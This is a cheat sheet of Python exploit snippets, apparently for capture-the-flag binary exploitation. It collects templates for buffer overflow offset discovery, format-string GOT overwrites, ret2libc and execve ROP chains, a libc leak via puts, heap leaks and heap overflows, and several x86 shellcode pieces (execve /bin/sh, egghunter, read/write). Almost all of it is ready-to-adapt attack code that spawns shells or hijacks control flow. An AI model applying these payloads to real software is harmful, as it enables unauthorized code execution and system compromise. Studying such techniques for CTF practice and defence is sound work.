##################### FIND OVERFLOW OFFSET ########################

p.sendline(cyclic(0x1000))
p.wait()
core = Coredump('./core')
print(cyclic_find(core.eip))

############ FORMAT STRING GENERATION #############################

def get_n(new, prev, size):
	while new <= prev:
		new += (1 << size)
	return new-prev

def gen_addrs(base_addr):
	addrs = b''
	for i in range(4):
		addrs += p32(base_addr + i)
	return addrs

def gen_format_writes(to_write, setup_len, stack_offset):
	payload = b''
	n_val = [setup_len]
	for i in range(4):
		n_val += [get_n(to_write[i], sum(n_val[:i+1]), 8)]
		payload += '%{}c'.format(n_val[i+1]).encode()
		payload += '%{}$hhn'.format(stack_offset + i).encode()
	return payload

payload = gen_addrs(printf_got_addr)
setup_len = len(payload)
payload += gen_format_writes(win_addr, setup_len, 5)

################### PAYLOAD PADDER ################################

# ideal for making NOPsled or RETsled
def pad(payload, padded_len, padding_data):
	payload_len = len(payload)
	pad_count = (padded_len - payload_len) // len(padding_data)
	return padding_data*pad_count + payload

#################### ROP SHELL #################################

payload += p32(ret_gadget)
payload += p32(libc.symbols['system'])
payload += p32(0xdeadbeef)
payload += p32(next(libc.search(b'/bin/sh')))

################## HEAP LEAK FWD POINTER #########################

create(0)
create(1)
create(2)
create(3)
free(1)
free(2)
create(4) # same addr as q2

# note that this fwd pointer should point to the first chunk of q1
heap_chunk_1 = u32(ask(4)[:4])

############## HEAP OVERFLOW (WITH PRESERVATION) #################

# this function will abuse the heap overflow
def gen_addr_payload(addr, metadata):
	overflow = b'A'*0x1c #fills it's own allocated string space with 'A's
	overflow += p32(metadata) #preserve next question's, chunk 1 metadata
	overflow += b'A'*0x18 #fill the next question's chunk 1
	overflow += p32(addr) #overwrite next question's string pointer
	overflow += p32(metadata) #preserve next questions, chunk 2 metadata (due to \n overflow)
	return overflow

##################### ROP WRITING TO .DATA ########################

payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x6e69622f) # /bin
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da060) #.data
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x68732f2f) # //sh
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da064) #.data+0x4
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
payload += p32(0x0806eb8b) #pop edx; ret; 
payload += p32(0x00000000) #null
payload += p32(0x08064564) #mov eax, edx; ret;
payload += p32(0x0806eb8b) #pop edx; ret;
payload += p32(0x080da068) #.data+0x8
payload += p32(0x08056c45) #mov dword ptr [edx], eax; ret; 
payload += p32(0x08056114) #pop eax; pop edx; pop ebx; ret;
payload += p32(0x0000000b) #syscall number 0xb
payload += p32(0x00000000) #null
payload += p32(0x080da060) #.data
payload += p32(0x0806ef51) #xor ecx, ecx; int 0x80;

###################### ROP PUTS(PUTS) ###############################

payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['main'])
payload += p32(elf.got['puts'])

#################### POP A SHELL SHELLCODE ########################

shellcode = asm(""" xor eax, eax
					xor ecx, ecx
					xor edx, edx
					push ecx
					push 0x68732f2f
					push 0x6e69622f
					mov al, 0x0b
					mov ebx, esp
					int 0x80 """)

#################### EGGHUNTER SHELLCODE #########################

egghunter = asm(""" mov eax, 0x90909090
					mov edi, {}
					incr:
						scasd
						jnz incr
					jmp edi
					""".format(stack_addr))


egg = b'\x90'*12
egg += asm("""xor eax, eax
		      xor ebx, ebx
			  xor edx, edx
		      mov al, 0x3
		      mov bx, 0x3E8
		      mov ecx, esp
		      mov dl, 0xFF
		      int 0x80

		      xchg eax, edx
		      mov al, 0x4
		      mov bx, 0x1
		      int 0x80
		    """)

################### READ AND WRITE SHELLCODE ####################
shellcode = asm(""" sub esp, 0x3E8
					xor eax, eax
				    xor ebx, ebx
					xor edx, edx
				    mov al, 0x3
				    mov bx, 0x3E8
				    mov ecx, esp
				    mov dl, 0xFF
				    int 0x80

				    xchg eax, edx
				    mov al, 0x4
				    mov bx, 0x1
				    int 0x80

				    add esp, 0x3E8
				    """)

#################### THINGS TO WATCH OUT #####################
# 0x0a in addresses/strings - newline character ends fgets() and gets()
# 0x20 in addresses - space character can cause issues
# 0x00 in addresses - null character will cause early termination with string functions
